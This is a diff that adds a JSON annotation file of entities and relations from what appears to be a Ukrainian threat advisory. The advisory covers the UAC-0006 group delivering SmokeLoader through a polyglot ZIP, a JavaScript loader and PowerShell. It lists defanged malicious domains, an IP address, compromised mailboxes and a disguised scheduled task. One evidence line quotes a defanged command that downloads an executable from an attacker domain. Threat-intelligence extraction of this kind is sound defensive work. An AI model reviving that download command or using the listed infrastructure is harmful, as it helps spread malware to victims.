@@ -1,0 +1,239 @@
+{
+  "entities": [
+    {
+      "name": "України",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe."
+    },
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cybercriminal group targeting Ukrainian organizations to steal funds via compromised banking credentials."
+    },
+    {
+      "name": "SmokeLoader",
+      "kind": "malware family",
+      "gloss": "A modular malicious bot program primarily used to download and execute additional malware payloads."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software component",
+      "gloss": "A Microsoft Windows component that provides scripting capabilities such as VBScript and JScript."
+    },
+    {
+      "name": "wscript.exe",
+      "kind": "executable file",
+      "gloss": "The command-line and GUI binary for the Windows Script Host."
+    },
+    {
+      "name": "pax_2023_ab1058.zip",
+      "kind": "file",
+      "gloss": "A malicious polyglot ZIP archive distributed as an email attachment in cyber attacks."
+    },
+    {
+      "name": "pax_2023_AB1058.pdf",
+      "kind": "file",
+      "gloss": "A decoy PDF document contained within a malicious polyglot ZIP archive."
+    },
+    {
+      "name": "pax_2023_AB1058..js",
+      "kind": "file",
+      "gloss": "A malicious JavaScript loader script extracted from an archive to execute PowerShell commands."
+    },
+    {
+      "name": "portable.exe",
+      "kind": "file",
+      "gloss": "A malicious executable file downloaded to launch the SmokeLoader payload."
+    },
+    {
+      "name": "smoke.exe",
+      "kind": "file",
+      "gloss": "An executable binary containing the SmokeLoader malware payload."
+    },
+    {
+      "name": "Firefox Default Browser Agent D0D690C3E3EC0AB0",
+      "kind": "scheduled task",
+      "gloss": "A scheduled task created by malware to maintain persistence under the disguise of a legitimate browser task."
+    },
+    {
+      "name": "beliy@atl.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious spam."
+    },
+    {
+      "name": "inbox6@dl.kr-admin.gov.ua",
+      "kind": "email address",
+      "gloss": "A compromised email address used to send malicious email messages."
+    },
+    {
+      "name": "nvn@mayak.dp.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to propagate malicious messages."
+    },
+    {
+      "name": "homospoison[.]ru",
+      "kind": "internet domain",
+      "gloss": "A malicious internet domain used to host executable payloads."
+    },
+    {
+      "name": "3dstore[.]pro",
+      "kind": "internet domain",
+      "gloss": "A domain identified as network infrastructure related to the malicious campaign."
+    },
+    {
+      "name": "balkimotion[.]ru",
+      "kind": "internet domain",
+      "gloss": "A malicious internet domain associated with threat actor operations."
+    },
+    {
+      "name": "coudzoom[.]ru",
+      "kind": "internet domain",
+      "gloss": "An internet domain used in cyber threat operations."
+    },
+    {
+      "name": "criticalosl[.]tech",
+      "kind": "internet domain",
+      "gloss": "An internet domain associated with cyber threat activity."
+    },
+    {
+      "name": "humanitarydp[.]ug",
+      "kind": "internet domain",
+      "gloss": "A malicious domain identified in the incident campaign."
+    },
+    {
+      "name": "ipodromlan[.]ru",
+      "kind": "internet domain",
+      "gloss": "A domain linked to malicious cyber infrastructure."
+    },
+    {
+      "name": "lamazone[.]site",
+      "kind": "internet domain",
+      "gloss": "An internet domain associated with malicious network activity."
+    },
+    {
+      "name": "ligaspace[.]ru",
+      "kind": "internet domain",
+      "gloss": "A domain name identified as part of threat infrastructure."
+    },
+    {
+      "name": "maximprofile[.]net",
+      "kind": "internet domain",
+      "gloss": "A network domain identified as an indicator of compromise."
+    },
+    {
+      "name": "redport80[.]ru",
+      "kind": "internet domain",
+      "gloss": "A domain associated with the malicious campaign."
+    },
+    {
+      "name": "shopersport[.]ru",
+      "kind": "internet domain",
+      "gloss": "An internet domain identified in malicious operations."
+    },
+    {
+      "name": "sindoproperty[.]org",
+      "kind": "internet domain",
+      "gloss": "An internet domain linked to threat actor activity."
+    },
+    {
+      "name": "superboler[.]com",
+      "kind": "internet domain",
+      "gloss": "A malicious internet domain associated with the campaign."
+    },
+    {
+      "name": "zaliphone[.]com",
+      "kind": "internet domain",
+      "gloss": "A domain identified as an indicator of compromise in the incident."
+    },
+    {
+      "name": "193[.]106.175.177",
+      "kind": "ip address",
+      "gloss": "An IP address identified as threat infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "operates",
+      "tail": "SmokeLoader",
+      "evidence": "активність групи UAC-0006... здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "contains-file",
+      "tail": "pax_2023_AB1058..js",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку та JavaScript-файл \"pax_2023_AB1058..js\""
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "contains-file",
+      "tail": "pax_2023_AB1058.pdf",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку"
+    },
+    {
+      "head": "pax_2023_AB1058..js",
+      "type": "uses-tool",
+      "tail": "PowerShell",
+      "evidence": "JavaScript-файл \"pax_2023_AB1058..js\", який, використовуючи PowerShell"
+    },
+    {
+      "head": "pax_2023_AB1058..js",
+      "type": "downloads-and-executes",
+      "tail": "portable.exe",
+      "evidence": "забезпечить завантаження та запуск виконуваного файлу \"portable.exe\""
+    },
+    {
+      "head": "portable.exe",
+      "type": "launches",
+      "tail": "SmokeLoader",
+      "evidence": "\"portable.exe\". Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "SmokeLoader",
+      "type": "establishes-persistence-via",
+      "tail": "Firefox Default Browser Agent D0D690C3E3EC0AB0",
+      "evidence": "Персистентність запуску SmokeLoader буде забезпечено шляхом створення запланованого завдання, наприклад: \"C:\\Windows\\System32\\Tasks\\Firefox Default Browser Agent D0D690C3E3EC0AB0\""
+    },
+    {
+      "head": "homospoison[.]ru",
+      "type": "hosts",
+      "tail": "portable.exe",
+      "evidence": "downloadfile('hxxp://homospoison[.]ru/one/portable.exe','%%temp%%gEq94.exe')"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "operates",
+      "definition": "A threat actor utilizes or controls a specific malware family or tool."
+    },
+    {
+      "name": "contains-file",
+      "definition": "An archive, container, or polyglot file includes another specified file."
+    },
+    {
+      "name": "uses-tool",
+      "definition": "A file or script executes or leverages a specific software utility to perform actions."
+    },
+    {
+      "name": "downloads-and-executes",
+      "definition": "A script or malware component downloads another file from the network and launches it."
+    },
+    {
+      "name": "launches",
+      "definition": "An executable or component starts the execution of another program or payload."
+    },
+    {
+      "name": "establishes-persistence-via",
+      "definition": "A malware program creates or configures an artifact such as a scheduled task to maintain survival across reboots."
+    },
+    {
+      "name": "hosts",
+      "definition": "A network domain or server hosts a malicious file for download."
+    }
+  ]
+}
